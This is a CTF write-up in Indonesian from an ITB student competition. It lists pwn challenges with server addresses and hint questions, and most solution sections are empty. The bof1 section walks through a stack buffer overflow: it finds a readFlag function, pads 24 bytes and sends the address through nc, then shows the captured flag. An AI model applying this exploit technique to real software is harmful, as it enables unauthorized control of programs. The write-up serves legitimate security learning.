# ctf hehe Write Up
ctf ini diadakan oleh mahasiswa ITB 18 untuk mengenalkan CTF pada mahasiswa ITB 19, juga untuk melatih dan mempersiapkan mahasiswa demi membuat ITB lebih maju lagi #MakeITBGreatAgain

# Pwn

## Penjara Ular 1

**Challenge**
nc 13.228.30.172 10009

How do you get the value of secret?
Is python2's input() function safe?

**Solution**


## Penjara Ular 2

**Challenge**
nc 13.228.30.172 10008

The program will not give you the flag, you must escape the program!
How do you exit the program to control the system?
Is python2's input() function safe?

**Solution**


## sukses

**Challenge** 
nc 13.228.30.172 10006

What is the difference between signed and unsigned integers?
What is integer overflow?

**Solution**


## bof0

**Challenge**
nc 13.228.30.172 10001

What is a buffer overflow vulnerability?
Is gets() function safe?
How much space is allocated for your input, what about the variable it is being compared to?

**Solution**


## bof1

**Challenge**
nc 13.228.30.172 10002

What is a buffer overflow vulnerability?
Is gets() function safe?
How much space is allocated for your input?
Try examining it on gdb/IDA
What is a stack frame?
What is a function's return address?
How does the program know which function to call next, can you control the program flow?

**Solution**
Dilakukan reversing pada file yang diberikan ('bof1') dengan menggunakan perintah 'readElf -a'. Setelah melihat-lihat terdapat sebuah fungsi dengan nama yang menarik, yaitu 'readFlag' yang terletak pada address 0x04006d7. Sekarang yang perlu kita hanya perlu melakukan buffer overflow pada program dan 'loncat' ke address readFlag tersebut. Buffer Overflow dapat dilakukan dengan memasukkan input yang banyak sehingga program menjadi error. Dengan menggunakan code python di terminal
> python -c "print 'a'*3" | ./bof1

>python -c "print 'a'*24" | ./bof1

Setelah dicoba-coba ditemukan bahwa program mengalami buffer overflow ketika diberi 24 karakter a, sekarang yang perlu dilakukan adalah mengubah bentuk address dengan menggunakan pwntools yang dijalankan di python
> import pwn
> pwn.p32(0x04006d7)

didapatkan '\xd7\x06@\x00' setelah itu langsung saja digunakan kepada server dengan memasukkan perintah berikut pada terminal
> python -c "print 'a'*24+'\xd7\x06@\x00'" | nc 13.228.30.172 10002

didapatkan output berupa

> hi! change the string to >w< and we'll see what happens!
your input: string is: aaaaaaaaaaaaaaaa�@
not yet :(
keep trying!
CTF{ch4ng3_th3_progr4m_fl0o0w}aaaaaaaaaap�e



## machina

**Challenge**
nc 13.228.30.172 10005

The program will not give you the flag, you must control the system to get the flag!
What is a shellcode?
How can you craft a shellcode that will give you the shell/system?

**Solution**


# Web Exploitation

## 

**Challenge**


**Solution**
